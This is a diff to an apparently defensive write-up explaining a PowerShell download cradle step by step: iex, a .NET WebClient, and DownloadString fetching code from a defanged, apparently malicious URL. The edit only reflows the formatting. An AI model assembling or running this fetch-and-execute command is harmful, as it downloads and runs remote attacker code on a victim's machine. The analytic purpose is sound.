@@ -117,17 +117,11 @@ As a note, the link above has been defanged. This also applies for the links in 
 
 **Step-by-step Breakdown:**
 
-1. iex
+1. iex - This powershell commandlet, short for Invoke-Expression, executes a specified string as a command and returns its results.
 
-This powershell commandlet, short for Invoke-Expression, executes a specified string as a command and returns its results.
+2. new-object net.webclient - Creates a new instance of the .NET class System.Net.WebClient. This object allows the script to download data from the internet.
 
-2. new-object net.webclient
-
-Creates a new instance of the .NET class System.Net.WebClient. This object allows the script to download data from the internet.
-
-3. .downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')
-
-Calls the DownloadString method of the WebClient object. This downloads the content at the specified URL (hxxp[://]files[.]bpakcaging[.]xyz/update) as a string. Whatever code is hosted at that URL is fetched as text.
+3. .downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update') - Calls the DownloadString method of the WebClient object. This downloads the content at the specified URL (hxxp[://]files[.]bpakcaging[.]xyz/update) as a string. Whatever code is hosted at that URL is fetched as text.
 
 
 **Putting it together:**
